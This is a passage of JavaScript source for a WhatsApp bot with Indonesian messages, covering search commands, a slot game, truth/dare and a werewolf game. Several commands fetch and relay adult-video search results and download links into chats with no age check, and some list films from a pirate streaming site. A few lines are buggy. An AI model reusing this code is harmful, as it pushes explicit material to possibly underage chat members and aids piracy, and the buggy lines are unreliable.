txt += `*Link :* ${x.link}\n`
txt += `*Thumbnail :* ${x.thumbnail}\n`
txt += `───────────────────`
}
RezzHost.sendMessage(m.chat, { image: { url: anu[0].thumbnail }, caption: txt }, { quoted : m })
	}
break
case 'xhamster': {
if (!text) throw `Just type query what u need : *${prefix + command} japanese*\n\nFor show info / download link : *${prefix + command} xhamster_url*`
	if (text.includes('http://') || text.includes('https://')) {
		try {
			let anu = await fetchJson(`https://api.lolhuman.xyz/api/xhamster?apikey=${apikey}&url=${text}`)
			anu = anu.result
			let txt = `*${anu.title}*\n\n`
			txt += `Duration : ${anu.duration}\n`
			txt += `Uploader : ${anu.author}\n`
			txt += `Upload : ${anu.upload}\n`
			txt += `View : ${anu.views}\n`
			txt += `*Rating : ${anu.rating}*\n\n`
			txt += `Like : ${anu.likes}\n`
			txt += `Dislike : ${anu.dislikes}\n`
			txt += `Comment : ${anu.comments}\n\n`
			txt += '*Link :*'
			for (let x of Object.keys(anu.download)) {
				txt += `\n\n*${x}*\n`
				txt += anu.download[x]
			}
			let dlny = await getRandom(anu.download[x])
			RezzHost.sendMessage(m.chat, { image: { url: anu.thumbnail }, caption: txt }, { quoted : m }).catch(_ => reply(txt))
			await RezzHost.sendMessage(m.chat, { video: { url: dlny }, caption: mess.done }, { quoted: kalgans })
		} catch (e) {
			console.log(e)
			throw 'invalid url / server down'
		}
	} else {
		try {
			let anu = await fetchJson(`https://api.xfarr.com/api/search/xhamster?apikey=${xfarApi}&query=${text}`)
			anu = anu.result
			let txt = `Found : *${text}*`
			for (var x of anu) {
				txt += `\n\nTitle : ${x.title}\n`
				txt += `Views : ${x.views}\n`
				txt += `Duration : ${x.duration}\n`
				txt += `Link : ${x.url}\n`
				txt += `───────────────────`
			}
			reply(txt)
		} catch (e) {
			console.log(e)
			throw 'invalid url / server down.'
		}
	}
}
break
case 'yandexreverse': {
if (!quoted) return reply(`[ ! ] send/reply your image with caption *${prefix + command}*`)
if (!/image\/(jpe?g|png)/.test(mime) && !/webp/.test(mime)) return reply(`[ ! ] send/reply your image with caption *${prefix + command}*`)
reply(mess.search)
let img = await quoted.download()
let out = await uploadImage(img)
let anu = await (await fetch(`https://api.lolhuman.xyz/api/reverseyandex?apikey=${apikey}&img=${out}`)).json()
reply(`[ YANDEX REVERSE SEARCH ]\n\n_${anu.result}_`)
}
break
case 'goglereverse': {
if (!quoted) return reply(`Kirim Gambar Dengan Caption *${prefix + command}*`)
if (!/image\/(jpe?g|png)/.test(mime) && !/webp/.test(mime)) return reply(`Kirim Gambar Dengan Caption *${prefix + command}*`)
reply(mess.search)
let img = await quoted.download()
let out = await uploadImage(img)
let anu = await (await fetch(`https://api.lolhuman.xyz/api/googlereverse?apikey=${apikey}&img=${out}`)).json()
reply(`[ GOOGLE REVERSE SEARCH ]\n\n_${anu.result}_`)
}
break
case 'searchplace': {
reply(mess.search)
let anu = await fetchJson(`https://api.lolhuman.xyz/api/searchplace?apikey=${apikey}&query=${text}`)
		anu = anu.result
		let txt = `*Ditemukan ${anu.length} daerah*`
		for (let x of anu) {
			txt += `\n\n*${x.display_name}*`
			for (let y of Object.keys(x.full)) {
				if (!/ISO/.test(y)) txt += `\n*${y} :* ${x.full[y]}`
			}
			txt += `\n───────────────────`
		}
		await RezzHost.sendMessage(m.chat, { location: { degreesLatitude: anu[0].latitude, degreesLongitude: anu[0].longitude } }, { ephemeralExpiration: 604800 }).then(_ => reply(txt))
	}
break
case 'streambokepindo': {
if (!text) return reply("[ ! ] *example:* .streambokepindo LinkVideo")
reply(mess.getdata)
try {
let item = await streamBokepindo(text)
let cap = `🔍 *[ RESULT ]*

🔗 link: ${item}
`
await reply(cap)
} catch (e) {
await m.reply(eror)
}
}
break
case 'searchbokepindo': {
if (!text) return reply(`Example: ${prefix + command} pijat`)
reply(mess.search)
let res = await searchBokepindo(text)
let teks = res.map((item, index) => {
return `🔍 *[ HASIL ${index + 1} ]*

🆔 Video UID: ${item.videoUid}
📂 Post ID: ${item.postId}
📚 Judul: ${item.title}
🖼️ Thumbnail: ${item.thumbnailSrc}
📽️ HD Video: ${item.hdVideo}
👁️ Views: ${item.views}
⌛ Durasi: ${item.duration}
🔗 Link Video: ${item.videoLink}
`;
}).filter(v => v).join("\n\n________________________\n\n");
await reply(teks)
}
break
case 'pornhub': {
if (!text) throw `Just type query what u need : *${prefix + command} step sister*\n\nFor show info / download link : *${prefix + command} pornhub_url*`
reply('_process. . .._')
	if (text.includes('http://') || text.includes('https://')) {
		if (!text.includes('pornhub')) throw 'Situs pornhub atau apa itu ngab?'
		try {
			let anu = await fetchJson(`https://api.lolhuman.xyz/api/pornhub?apikey=${apikey}&url=${text}`)
			anu = anu.result
			let txt = `*${anu.title}*\n\n`
			txt += `Duration : ${anu.duration}\n`
			txt += `View : ${anu.views}\n`
			txt += `Geo : *${anu.geo}*\n\n`
			txt += `Like : ${anu.like}\n`
			txt += `Dislike : ${anu.dislike}\n`
			txt += `Upload : ${anu.upload}`
			for (let x of anu.media) {
				txt += `\n\n*${x.quality} - ${x.format}*\n`
				txt += `${x.url}`
			}		
			RezzHost.sendMessage(m.chat, { image: { url: anu.thumb }, caption: txt }, { quoted : kalgans })
		} catch (e) {
			console.log(e)
			reply(mess.error)
		}
	} else {
		try {
			let res = await dylux.phSearch(text)
			let teks = `乂 *P O R N H U B - S E A R C H*\n\n`
res.map((v, i) => {
teks += `${i+1}. ${v.title}\n`
teks += `*Title* : ${v.title}\n`
teks += `*Uploader* : ${v.uploader}\n`
teks += `*Duration* : ${v.duration}\n`
teks += `*Views* : ${v.views}\n`
teks += `*Link* : ${v.link}\n\n───────────────\n\n`
}).join('\n\n')
teks += `${footer}`
reply(teks) 
} catch (e) {
			console.log(e)
			reply(mess.error)
		}
		}
	}
break
case 'linesticksearch':{
if (!isCreator) return reply(mess.owner)  
if (!text) return reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : ${prefix+command} 𝗷𝗮𝗽𝗮𝗻𝘀𝗲`)
reply(mess.search)
let anu = await scpBcl.stickerLine(text)
let teks = `乂 *L I N E S T I C K - S E A R C H*\n\n`
anu.map((v, i) => {
teks += `${i+1}. ${v.title}\n`
teks += `*Title* : ${v.title}\n`
teks += `*Id* : ${v.id}\n`
teks += `*Author* : ${v.authorName}\n`
teks += `*UrlSticker* : ${v.sticker}\n`
teks += `*UrlAnimated* : ${v.stickerAnimated}\n`
teks += `*Link* : ${v.url}\n\n───────────────\n\n`
}).join('\n\n')
teks += `${footer}`
reply(teks) 
}
break
case 'telesticksearch': {
if (!text) return reply(`Example: ${prefix + command} Doraemon`)
reply(mess.search)
let json = await stickerTelegram(text)
if (json.length != 0) {
let txt = `*Found : ${text}*`
for (var x in json) {
txt += `\n\n${json[x].title}\n`
txt += `_${json[x].link}_\n`
txt += `───────────────────`
}
reply(txt)
} else {
reply(`Tidak ditemukan hasil.`)
}
}
break
case 'harilibur':{
if (!isCreator) return reply(mess.owner)  
if (!text) return reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : ${prefix+command} 2024`)
reply(mess.search)
let anu = await fetchJson(`https://api.caliph.biz.id/api/harilibur?tahun=${text}&apikey=${caliph}`)
no = 0
let teks = `乂 *H A R I L I B U R - S E A R C H*\n\n`
anu.result.data.map((v, i) => {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Tanggal: ${v.tanggal}\n`
teks += `Bulan: ${v.bulan}\n`
teks += `Event: ${v.event}\n\n───────────────\n\n`
}).join('\n\n')
teks += `${footer}`
RezzHost.sendMessage(m.chat, {
text: teks,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `乂 HARI LIBUR TAHUN ${anu.result.tahun}`,
body: '',
thumbnailUrl: ppuser,
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
}
break
case 'event':{
let anu = await chApi.nexLibur()
no = 0
let teks = `${gris}[ E V E N T ]${gris}\n\n`
teks += `${hiasan}*NextLibur* : ${anu.nextLibur}\n\n───────────────\n`
anu.libnas_content.map((v, i) => {
no += 1
teks += `\n• ${no.toString()} •\n`
teks += `Tanggal: ${v.dateMonth}\n`
teks += `Hari: ${v.days}\n`
teks += `Event: ${v.summary}\n\n───────────────\n\n`
}).join('\n\n')
teks += `${footer}`
RezzHost.sendMessage(m.chat, {
text: teks,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `乂 E V E N T`,
body: '',
thumbnailUrl: ppuser,
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
}
break
case 'covid': case 'corona': {
var res = await fetchJson(`https://api.lolhuman.xyz/api/corona/global?apikey=${apikey}`)
var hasil = `乂 C O V I D - 1 9

• Total Kasus: *${res.result.positif}*
• Total Pulih: *${res.result.sembuh}*
• Total Kematian: *${res.result.meninggal}*
• Total Dirawat: *${res.result.dirawat}*

${footer}
`
RezzHost.sendMessage(m.chat, {
text: hasil,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `乂 C O R O N A - G L O B A L`,
body: '',
thumbnailUrl: ppuser,
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
}
break
case 'steam': {
if (!text) return reply(`Example: ${prefix +command} panda`)
reply(mess.search)
json = await chApi.steam(text)
let p = `*✧ S T E A M*\n\n`
json.map((v, i) => {
p += `*${i+1}*. ${v.judul}\n`
p += `◦ *Rilis* : ${v.rilis}\n`
p += `◦ *Harga* : ${(v.harga)}\n`
p += `◦ *Link* : ${v.link}\n`
p += `◦ *Rating* : ${v.rating}\n\n`
}).join('\n\n')
p += `${footer}`
reply(p)
}
break
case 'whatmusic': {
if (!/audio/.test(mime)) return reply(`🚩 Only for audio.`)
if (!quoted) return reply(`🚩 Reply Audio.`)
await loading()
let { UploadFileUgu } = require('./lib/uploader2')
let media = await RezzHost.downloadAndSaveMediaMessage(quoted)
let pu = await UploadFileUgu(media)
let jsonq = await fetchJson(`https://aemt.me/whatmusic?url=${pu.url}`)
reply(jsonq.result)
}
break
case 'lk21now':{
if (!isCreator) return reply(mess.owner)  
reply(mess.search)
let anu = await fetchJson(`https://api.betabotz.eu.org/api/webzone/lk21latest?apikey=${btbApi}`)
let teks = `乂 *L K 2 1 - N O W*\n\n`
anu.result.map((v, i) => {
teks += `${i+1}. *Title* : ${v.title}\n`
teks += `*Genre* : ${v.genre}\n`
teks += `*Created* : ${v.dateCreated}\n`
teks += `*Director* : ${v.director}\n`
teks += `*Duration* : ${v.duration}\n`
teks += `*Rating* : ${v.rating}\n`
teks += `*Review* : ${v.review}\n`
teks += `*Type* : ${v.type}\n`
teks += `*Link* : ${v.url}\n\n───────────────\n\n`
}).join('\n\n')
teks += `${footer}`
reply(teks) 
}
break
case 'lk21':{
if (!isCreator) return reply(mess.owner)  
if (!text) return reply(`𝗘𝘅𝗮𝗺𝗽𝗹𝗲 : ${prefix+command} jkt48`)
reply(mess.search)
let anu = await fetchJson(`https://api.betabotz.eu.org/api/webzone/lk21search?query=${text}&apikey=${btbApi}`)
let teks = `乂 *L A Y A R K A C A - S E A R C H*\n\n`
anu.result.map((v, i) => {
teks += `${i+1}. *Title* : ${v.title}\n`
teks += `*Genre* : ${v.genre}\n`
teks += `*Created* : ${v.dateCreated}\n`
teks += `*Director* : ${v.director}\n`
teks += `*Duration* : ${v.duration}\n`
teks += `*Rating* : ${v.rating}\n`
teks += `*Review* : ${v.review}\n`
teks += `*Type* : ${v.type}\n`
teks += `*Link* : ${v.url}\n\n───────────────\n\n`
}).join('\n\n')
teks += `${footer}`
reply(teks) 
}
break


// BATAS SEARCHMENU

// GAME MENU

case 'gamechange':
                if (!isCreator) return reply(mess.owner)
                if (args.length < 1) return reply(`Example ${prefix + command} enable/disable`)
                if (q == 'enable') {
                    settings.game = true
                    reply(`Berhasil Mengubah ModeGame Ke ${q}`)
                } else if (q == 'disable') {
                    settings.game = false
                    reply(`Berhasil Mengubah ModeGame Ke ${q}`)
                }
                break   
case 'modegame': {
let { proto, generateWAMessageFromContent } = require('@whiskeysockets/baileys')
let msg = generateWAMessageFromContent(m.chat, {
    viewOnceMessage: {
        message: {
            "messageContextInfo": {
                "deviceListMetadata": {},
                "deviceListMetadataVersion": 2
            },
            interactiveMessage: proto.Message.InteractiveMessage.create({
                body: proto.Message.InteractiveMessage.Body.create({
                    text: ''
                }),
                footer: proto.Message.InteractiveMessage.Footer.create({
                    text: "[ *RezzBotz – New Version* ]"
                }),
                header: proto.Message.InteractiveMessage.Header.create({
                    title: `click button *enable* to enable modegame\nclick button *disable* to disable modegame\n`,
                    subtitle: "rorr",
                    hasMediaAttachment: false
                }),
                nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
                    buttons: [
{
"name": "quick_reply",
"buttonParamsJson": "{\"display_text\":\"Enable\",\"id\":\".gamechange enable\"}"
},
{
"name": "quick_reply",
"buttonParamsJson": "{\"display_text\":\"Disable\",\"id\":\".gamechange disable\"}"
},
 ],
 })
 })
 }
 }
}, {})

await RezzHost.relayMessage(msg.key.remoteJid, msg.message, {
 messageId: msg.key.id
})}
break

case 'slot': {
let reward = Func.randomInt(global.bmin, global.bmax)
      let emojis = ["🌟", "💥", "😈"]
      let a = Math.floor(Math.random() * emojis.length)
      let b = Math.floor(Math.random() * emojis.length)
      let c = Math.floor(Math.random() * emojis.length)
      let x = [],
         y = [],
         z = []
      for (let i = 0; i < 3; i++) {
         x[i] = emojis[a]
         a++
         if (a == emojis.length) a = 0
      }
      for (let i = 0; i < 3; i++) {
         y[i] = emojis[b]
         b++
         if (b == emojis.length) b = 0
      }
      for (let i = 0; i < 3; i++) {
         z[i] = emojis[c]
         c++
         if (c == emojis.length) c = 0
      }
      let end
      if (a == b && b == c) {
         end = `JACKPOT! *+${Func.formatNumber(reward)} point*`
         users.balance += reward
      } else if (a == b || a == c || b == c) {
         end = `Hampir Beruntung! *+1 Limits*`
         users.limit += 1
      } else {
         end = `LOSE! *-${Func.formatNumber(reward)} point*`
         if (reward > users.balance) {
            users.balance = 0
         } else {
            users.balance -= reward
         }
      }
      let teks = `乂  *S L O T S*\n\n`
      teks += `	[ ${x[0]} ${y[0]} ${z[0]} ]\n`
      teks += `	[ ${x[1]} ${y[1]} ${z[1]} ]\n`
      teks += `	[ ${x[2]} ${y[2]} ${z[2]} ]\n`
      teks += `\n${end}`
      reply(teks)
   }
   break

case 'dare': {
let dar = require('./lib/scrape/truthdare')
let dare = dar.dare
let teks = `乂  *D A R E*\n\n`;
teks += Func.random(dare);
RezzHost.sendMessage(m.chat, {
text: teks,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `© 2024 | D A R E`,
body: '',
thumbnailUrl: "https://telegra.ph/file/bf492ed7bd8241ca43289.jpg",
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
}
break

case 'truth': {
let tru = require('./lib/scrape/truthdare')
let truth = tru.truth
let teks = `乂  *T R U T H*\n\n`;
teks += Func.random(truth);
RezzHost.sendMessage(m.chat, {
text: teks,
contextInfo: {
externalAdReply: {
showAdAttribution: true,
title: `© 2024 | T R U T H`,
body: '',
thumbnailUrl: "https://telegra.ph/file/dc203f860ca55723913cd.jpg",
sourceUrl: hariini,
mediaType: 1,
renderLargerThumbnail: true
}}
})
}
break

case 'tebakgambar':
if (!settings.game) return m.reply(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.modegame* lalu click enable`) 
//if(!isGroup) return m.reply(mess.group)
if (from in tebakgambar2) return m.reply('Masih ada game yang belum diselesaikan');
var { img, jawaban, deskripsi } = pickRandom(JSON.parse(fs.readFileSync('./assets/game/tebakgambar.json')));
console.log('Jawaban : '+jawaban)
var teks1 = `*GAME TEBAK GAMBAR*\n\nPetunjuk: ${monospace(jawaban.replace(/[b|c|d|f|g|h|j|k|l|m|n|p|q|r|s|t|v|w|x|y|z]/gi, '-'))}\nDeskripsi: ${deskripsi}\nWaktu: ${gamewaktu} detik`
await RezzHost.sendMessage(from, {image: {url: img}, caption: teks1}, {quoted: m})
tebakgambar2[from] = {
soal: img,
jawaban: jawaban.toLowerCase(),
hadiah: randomNomor(10, 20),
waktu: setTimeout(function () {
if (tebakgambar2[from]) m.reply(`Waktu habis!\nJawabannya adalah: ${tebakgambar2[from].jawaban}`);
delete tebakgambar2[from];
}, gamewaktu * 1000)
}
break
case 'petakbom': case 'bomb': case 'tebakbom':{
if (!settings.game) return m.reply(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.modegame* lalu click enable`) 
if (sender in petakbom) return reply(`Game mu masih belum terselesaikan, lanjutkan yukk\n\n${petakbom[sender].board.join("")}\n\nKirim ${prefix}delpetakbom untuk menghapus game petak bom`);
function shuffle(array) {
return array.sort(() => Math.random() - 0.5);
}
petakbom[sender] = {
petak: shuffle([0, 0, 0, 2, 0, 2, 0, 2, 0, 0]),
board: ["1️⃣", "2️⃣", "3️⃣", "4️⃣", "5️⃣", "6️⃣", "7️⃣", "8️⃣", "9️⃣", "🔟"],
bomb: 3,
lolos: 7,
pick: 0,
hadiah: randomNomor(5000, 10000),
nyawa: ["❤️", "❤️", "❤️"]
};
await m.reply(`*PETAK BOM*

${petakbom[sender].board.join("")}

Pilih lah nomor tersebut! dan jangan sampai terkena Bom!
Bomb : ${petakbom[sender].bomb}
Nyawa : ${petakbom[sender].nyawa.join("")}`);
}
break
case 'delpetakbom': case 'delbomb': {
//if(!isGroup) return m.reply(mess.group)
if (!settings.game) return m.reply(`Aktifkan botsetting terlebih dahulu dengan cara masukkan perintah *.modegame* lalu click enable`) 
if (!(sender in petakbom)) return m.reply(`kamu sedang tidak bermain petakbom!`)
delete petakbom[sender];
RezzHost.sendMessage(m.chat, {react: {text: '🟢', key: m.key}})
reply(`Petakbom di akhiri, hadiah Rp. 0`)
}
break


case 'wwpc': case 'ww': case 'werewolf': {
try {
let jimp = require('jimp')
const resize = async (image, width, height) => {
    const read = await jimp.read(image);
    const data = await read.resize(width, height).getBufferAsync(jimp.MIME_JPEG);
    return data;
};

let {
    emoji_role,
    sesi,
    playerOnGame,
    playerOnRoom,
    playerExit,
    dataPlayer,
    dataPlayerById,
    getPlayerById,
    getPlayerById2,
    killWerewolf,
    killww,
    dreamySeer,
    sorcerer,
    protectGuardian,
    roleShuffle,
    roleChanger,
    roleAmount,
    roleGenerator,
    addTimer,
    startGame,
    playerHidup,
    playerMati,
    vote,
    voteResult,
    clearAllVote,
    getWinner,
    win,
    pagi,
    malam,
    skill,
    voteStart,
    voteDone,
    voting,
    run,
    run_vote,
    run_malam,
    runprefixagi
} = require('./lib/werewolf')

// [ Thumbnail ] 
let thumb =
    "https://user-images.githubusercontent.com/72728486/235316834-f9f84ba0-8df3-4444-81d8-db5270995e6d.jpg";

    const {
        sender,
        chat
    } = m;
    RezzHost.werewolf = RezzHost.werewolf ? RezzHost.werewolf : {};
    const ww = RezzHost.werewolf ? RezzHost.werewolf : {};
    const data = ww[chat];
    const value = args[0];
    const target = args[1];

    // [ Membuat Room ]
    if (value === "create") {
        if (chat in ww) return reply("Group masih dalam sesi permainan");
        if (playerOnGame(sender, ww) === true)
            return reply("Kamu masih dalam sesi game");
        ww[chat] = {
            room: chat,
            owner: sender,
            status: false,
            iswin: null,
            cooldown: null,
            day: 0,
            time: "malem",
            player: [],
            dead: [],
            voting: false,
            seer: false,
            guardian: [],
        };
        await reply("Room berhasil dibuat, ketik *.ww join* untuk bergabung");

        // [ Join sesi permainan ]
    } else if (value === "join") {
        if (!ww[chat]) return reply("Belum ada sesi permainan");
        if (ww[chat].status === true)
            return reply("Sesi permainan sudah dimulai");
        if (ww[chat].player.length > 16)
            return reply("Maaf jumlah player telah penuh");
        if (playerOnRoom(sender, chat, ww) === true)
            return reply("Kamu sudah join dalam room ini");
        if (playerOnGame(sender, ww) === true)
            return reply("Kamu masih dalam sesi game");
        let data = {
            id: sender,
            number: ww[chat].player.length + 1,
            sesi: chat,
            status: false,
            role: false,
            effect: [],
            vote: 0,
            isdead: false,
            isvote: false,
        };
        ww[chat].player.push(data);
        let player = [];
        let text = `\n*⌂ W E R E W O L F - P L A Y E R*\n\n`;
        for (let i = 0; i < ww[chat].player.length; i++) {
            text += `${ww[chat].player[i].number}) @${ww[chat].player[i].id.replace(
          "@s.whatsapp.net",
          ""
        )}\n`;
            player.push(ww[chat].player[i].id);
        }
        text += "\nJumlah player minimal adalah 5 dan maximal 15";
        RezzHost.sendMessage(
            m.chat, {
                text: text.trim(),
                contextInfo: {
                    externalAdReply: {
                        title: "W E R E W O L F",
                        mediaType: 1,
                        renderLargerThumbnail: true,
                        thumbnail: await resize(thumb, 300, 175),
                        sourceUrl: `${global.sgc}`,
                        mediaUrl: thumb,
                    },
                    mentionedJid: player,
                },
            }, {
                quoted: m
            }
        );

        // [ Game Play ]
    } else if (value === "start") {
        if (!ww[chat]) return reply("Belum ada sesi permainan");
        if (ww[chat].player.length === 0)
            return reply("Room belum memiliki player");
        if (ww[chat].player.length < 5)
            return reply("Maaf jumlah player belum memenuhi syarat");
        if (playerOnRoom(sender, chat, ww) === false)
            return reply("Kamu belum join dalam room ini");
        if (ww[chat].cooldown > 0) {
            if (ww[chat].time === "voting") {
                clearAllVote(chat, ww);
                addTimer(chat, ww);
                return await run_vote(RezzHost. chat, ww);
            } else if (ww[chat].time === "malem") {
                clearAllVote(chat, ww);
                addTimer(chat, ww);
                return await run_malam(RezzHost. chat, ww);
            } else if (ww[chat].time === "pagi") {
                clearAllVote(chat, ww);
                addTimer(chat, ww);
                return await runprefixagi(RezzHost. chat, ww);
            }
        }
        if (ww[chat].status === true)
            return reply("Sesi permainan telah dimulai");
        if (ww[chat].owner !== sender)
            return reply(
                `Hanya @${ww[chat].owner.split("@")[0]} yang dapat memulai permainan`
            );
        let list1 = "";
        let list2 = "";
        let player = [];
        roleGenerator(chat, ww);
        addTimer(chat, ww);
        startGame(chat, ww);
        for (let i = 0; i < ww[chat].player.length; i++) {
            list1 += `(${ww[chat].player[i].number}) @${ww[chat].player[
          i
        ].id.replace("@s.whatsapp.net", "")}\n`;
            player.push(ww[chat].player[i].id);
        }
        for (let i = 0; i < ww[chat].player.length; i++) {
            list2 += `(${ww[chat].player[i].number}) @${ww[chat].player[
          i
        ].id.replace("@s.whatsapp.net", "")} ${
          ww[chat].player[i].role === "werewolf" ||
          ww[chat].player[i].role === "sorcerer"
            ? `[${ww[chat].player[i].role}]`
            : ""
        }\n`;
            player.push(ww[chat].player[i].id);
        }
        for (let i = 0; i < ww[chat].player.length; i++) {
            // [ Werewolf ]
            if (ww[chat].player[i].role === "werewolf") {
                if (ww[chat].player[i].isdead != true) {
                    var textt = `Hai ${RezzHost.getName(
              ww[chat].player[i].id
            )}, Kamu telah dipilih untuk memerankan *Werewolf* ${emoji_role(
              "werewolf"
            )} pada permainan kali ini, silahkan pilih salah satu player yang ingin kamu makan pada malam hari ini\n*LIST PLAYER*:\n${list2}\n\nKetik *.wwpc kill nomor* untuk membunuh player`;
                    await RezzHost.sendMessage(ww[chat].player[i].id, {
                        text: textt,
                        mentions: player,
                    });
                }
                        // [ villager ]
            } else if (ww[chat].player[i].role === "warga") {
                if (ww[chat].player[i].isdead != true) {
                    let texttt = `*⌂ W E R E W O L F - G A M E*\n\nHai ${RezzHost.getName(
              ww[chat].player[i].id
            )} Peran kamu adalah *Warga Desa* ${emoji_role(
              "warga"
            )}, tetap waspada, mungkin *Werewolf* akan memakanmu malam ini, silakan masuk kerumah masing masing.\n*LIST PLAYER*:\n${list1}`;
                    await RezzHost.sendMessage(ww[chat].player[i].id, {
                        text: texttt,
                        mentions: player,
                    });
                }

                // [ Penerawangan ]
            } else if (ww[chat].player[i].role === "seer") {
                if (ww[chat].player[i].isdead != true) {
                    let texxt = `Hai ${RezzHost.getName(
              ww[chat].player[i].id
            )} Kamu telah terpilih  untuk menjadi *Penerawang* ${emoji_role(
              "seer"
            )}. Dengan sihir yang kamu punya, kamu bisa mengetahui peran pemain pilihanmu.\n*LIST PLAYER*:\n${list1}\n\nKetik *.wwpc dreamy nomor* untuk melihat role player`;

                    await RezzHost.sendMessage(ww[chat].player[i].id, {
                        text: texxt,
                        mentions: player,
                    });
                }

                // [ Guardian ]
            } else if (ww[chat].player[i].role === "guardian") {
                if (ww[chat].player[i].isdead != true) {
                    let teext = `Hai ${RezzHost.getName(
              ww[chat].player[i].id
            )} Kamu terpilih untuk memerankan *Malaikat Pelindung* ${emoji_role(
              "guardian"
            )}, dengan kekuatan yang kamu miliki, kamu bisa melindungi para warga, silahkan pilih salah 1 player yang ingin kamu lindungi\n*LIST PLAYER*:\n${list1}\n\nKetik *.wwpc deff nomor* untuk melindungi player`;
  
                    await RezzHost.sendMessage(ww[chat].player[i].id, {
                        text: teext,
                        mentions: player,
                    });
                }

                // [ Sorcerer ]
            } else if (ww[chat].player[i].role === "sorcerer") {
                if (ww[chat].player[i].isdead != true) {
                    let textu = `Hai ${RezzHost.getName(
              ww[chat].player[i].id
            )} Kamu terpilih sebagai Penyihir ${emoji_role(
              "sorcerer"
            )}, dengan kekuasaan yang kamu punya, kamu bisa membuka identitas para player, silakan pilih 1 orang yang ingin kamu buka identitasnya\n*LIST PLAYER*:\n${list2}\n\nKetik *.wwpc sorcerer nomor* untuk melihat role player`;

                    await RezzHost.sendMessage(ww[chat].player[i].id, {
                        text: textu,
                        mentions: player,
                    });
                }
            }
        }
        await RezzHost.sendMessage(m.chat, {
            text: "*⌂ W E R E W O L F - G A M E*\n\nGame telah dimulai, para player akan memerankan perannya masing masing, silahkan cek chat pribadi untuk melihat role kalian. Berhati-hatilah para warga, mungkin malam ini adalah malah terakhir untukmu",
            contextInfo: {
                externalAdReply: {
                    title: "W E R E W O L F",
                    mediaType: 1,
                    renderLargerThumbnail: true,
                    thumbnail: await resize(thumb, 300, 175),
                    sourceUrl: `${global.sgc}`,
                    mediaUrl: thumb,
                },
                mentionedJid: player,
            },
        });
        await run(RezzHost. chat, ww);
    } else      if (value === "kill") {
    let byId = getPlayerById2(sender, parseInt(target), ww); 
         if (dataPlayer(sender, ww).role !== "werewolf") 
             return m.reply("Peran ini bukan untuk kamu"); 
         if (byId.db.role === "sorcerer") 
             return m.reply("Tidak bisa menggunakan skill untuk teman"); 
                  if (playerOnGame(sender, ww) === false)
        return reply("Kamu tidak dalam sesi game")
    if (dataPlayer(sender, ww).status === true)
        return reply("Skill telah digunakan, skill hanya bisa digunakan sekali setiap malam")
    if (dataPlayer(sender, ww).isdead === true)
        return reply("Kamu sudah mati")
    if (!target || target.length < 1 || target.split('').length > 2) 
        return reply(`Masukan nomor player \nContoh : \n${prefix + command} kill 1`)
    if (isNaN(target)) 
        return reply("Gunakan hanya nomor")
    if (byId.db.isdead === true) 
        return reply("Player sudah mati")
    if (byId.db.id === sender)
        return reply("Tidak bisa menggunakan skill untuk diri sendiri")
    if (byId === false) 
        return reply("Player tidak terdaftar")
      reply("Berhasil membunuh player " + parseInt(target)) 
             .then(() => { 
                 dataPlayer(sender, ww).status = true; 
                 killWerewolf(sender, parseInt(target), ww); 
             }); 
     } else if (value === "dreamy") { 
         if (dataPlayer(sender, ww).role !== "seer") 
             return m.reply("Peran ini bukan untuk kamu"); 
                  if (playerOnGame(sender, ww) === false)
        return reply("Kamu tidak dalam sesi game")
    if (dataPlayer(sender, ww).status === true)
        return reply("Skill telah digunakan, skill hanya bisa digunakan sekali setiap malam")
    if (dataPlayer(sender, ww).isdead === true)
        return reply("Kamu sudah mati")
    if (!target || target.length < 1 || target.split('').length > 2) 
        return reply(`Masukan nomor player \nContoh : \n${prefix + command} kill 1`)
    if (isNaN(target)) 
        return reply("Gunakan hanya nomor")
    let byId = getPlayerById2(sender, parseInt(target), ww)
    if (byId.db.isdead === true) 
        return reply("Player sudah mati")
    if (byId.db.id === sender)
        return reply("Tidak bisa menggunakan skill untuk diri sendiri")
    if (byId === false) 
        return reply("Player tidak terdaftar")
         let dreamy = dreamySeer(m.sender, parseInt(target), ww); 
         reply(`Berhasil membuka identitas player ${target} adalah ${dreamy}`) 
             .then(() => { 
                 dataPlayer(sender, ww).status = true; 
             }); 
     } else if (value === "deff") { 
         if (dataPlayer(sender, ww).role !== "guardian") 
             return m.reply("Peran ini bukan untuk kamu"); 
                  if (playerOnGame(sender, ww) === false)
        return reply("Kamu tidak dalam sesi game")
    if (dataPlayer(sender, ww).status === true)
        return reply("Skill telah digunakan, skill hanya bisa digunakan sekali setiap malam")
    if (dataPlayer(sender, ww).isdead === true)
        return reply("Kamu sudah mati")
    if (!target || target.length < 1 || target.split('').length > 2) 
        return reply(`Masukan nomor player \nContoh : \n${prefix + command} kill 1`)
    if (isNaN(target)) 
        return reply("Gunakan hanya nomor")
    let byId = getPlayerById2(sender, parseInt(target), ww)
    if (byId.db.isdead === true) 
        return reply("Player sudah mati")
    if (byId.db.id === sender)
        return reply("Tidak bisa menggunakan skill untuk diri sendiri")
    if (byId === false) 
        return reply("Player tidak terdaftar")
         reply(`Berhasil melindungi player ${target}`).then(() => { 
             protectGuardian(m.sender, parseInt(target), ww); 
             dataPlayer(sender, ww).status = true; 
         }); 
     } else if (value === "sorcerer") {
         if (dataPlayer(sender, ww).role !== "sorcerer") 
             return m.reply("Peran ini bukan untuk kamu"); 
             if (playerOnGame(sender, ww) === false)
        return reply("Kamu tidak dalam sesi game")
    if (dataPlayer(sender, ww).status === true)
        return reply("Skill telah digunakan, skill hanya bisa digunakan sekali setiap malam")
    if (dataPlayer(sender, ww).isdead === true)
        return reply("Kamu sudah mati")
    if (!target || target.length < 1 || target.split('').length > 2) 
        return reply(`Masukan nomor player \nContoh : \n${prefix + command} kill 1`)
    if (isNaN(target)) 
        return reply("Gunakan hanya nomor")
